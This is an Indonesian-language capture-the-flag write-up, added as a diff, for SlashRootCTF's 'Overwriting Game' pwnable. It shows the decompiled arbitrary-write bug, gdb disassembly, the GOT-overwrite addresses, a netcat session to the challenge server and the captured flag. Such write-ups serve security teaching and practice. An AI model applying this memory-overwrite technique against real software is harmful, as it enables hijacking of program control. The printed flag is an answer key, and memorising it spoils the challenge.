@@ -1,0 +1,82 @@
+
+
+~ Overwriting Game ~ Pwnable ~ SlashRootCTF (50pts)
+
+Diberikan sebuah binary elf 32bit, binary ini meminta 2 buah input, input
+pertama yaitu alamat memory, input ke-2 yaitu sebuah nilai. Nanti nilai itu
+akan diisi ke alamat memory yg tadi kita input kan. Kita bebas menentukan 
+alamat memori manapun dan nilai apapun. seperti inilah scrip program tersebut
+
+-----------*snip*-------------
+
+        printf("Alamat mana yang akan di-overwrite? ");
+        fflush(stdout);
+        __isoc99_scanf("%p", &v2);
+        printf("Masukan nilai: ");
+        fflush(stdout);
+        __isoc99_scanf("%p", &v1);
+        printf("Overwrite %p ke %p...\n", v1, v2);
+        fflush(stdout);
+        *v2 = v1;                                     // [1] Overwriting
+        puts("Berhasil melakukan overwriting!");      // [2] Pemanggilan fungsi puts setelah overwrite
+        fflush(stdout);
+        printf("Pin 1: %p\n", pin_1);
+        printf("Pin 2: %p\n", pin_2);
+        fflush(stdout);
+      }
+      if ( pin_1 != -559026163 && pin_2 != -72499473 && pin_1 == pin_2 )
+      {
+        puts("Mantap, ambil flagnya!");
+        fflush(stdout);
+        system("cat flag.txt");                        // [3] Membaca flag
+        exit(0);
+      
+-----------*snip*------------
+
+Cara yang saya lakukan mudah, karena fungsi puts dipanggil setelah overwriting, saya
+mencoba mengoverwrite lokasi got.plt nya fungsi puts, dan mengisinya dengan alamat eip
+dimana system("cat flag.txt") dipanggil
+
+-----------*snip*------------
+
+gdb-peda$ pdisas the_game
+Dump of assembler code for function the_game:
+     -----<Bagian ini dipotong>------
+   0x080486de <+401>:   mov    DWORD PTR [esp],0x8048880
+   0x080486e5 <+408>:   call   0x80483f0 <puts@plt>
+   0x080486ea <+413>:   mov    eax,ds:0x804a040
+   0x080486ef <+418>:   mov    DWORD PTR [esp],eax
+   0x080486f2 <+421>:   call   0x80483e0 <fflush@plt>
+   0x080486f7 <+426>:   mov    DWORD PTR [esp],0x8048897  // Disinilah system("cat flag.txt") dipanggil
+   0x080486fe <+433>:   call   0x8048400 <system@plt>     // berada dialamat 0x080486f7
+   0x08048703 <+438>:   mov    DWORD PTR [esp],0x0
+   0x0804870a <+445>:   call   0x8048420 <exit@plt>
+     -----<Bagian ini dipotong>------
+gdb-peda$ disas puts
+Dump of assembler code for function puts@plt:
+   0x080483f0 <+0>: jmp    DWORD PTR ds:0x804a014         // alamat puts got.plt berada di 0x804a014
+   0x080483f6 <+6>: push   0x10
+   0x080483fb <+11>:    jmp    0x80483c0
+End of assembler dump.
+
+-----------*snip*------------
+
+Alamat yg ingin di overwrite 0x804a014 dengan nilai 0x080486f7
+Sekarang tinggal eksekusi ;)
+
+----------------------------
+
+ramdhan@n0psledbyt3:~/slashroot$ nc 103.200.7.150 6666
+
+Pin 1: 0xdeadf00d
+Pin 2: 0xfbadbeef
+Selamat datang di overwriting game ...
+Alamat mana yang akan di-overwrite? 0x804a014
+Masukan nilai: 0x080486f7
+Overwrite 0x80486f7 ke 0x804a014...
+SlashRootCTF{overwrite_meh_like_a_b0$$}
+
+----------------------------
+
+Flag : SlashRootCTF{overwrite_meh_like_a_b0$$}
+
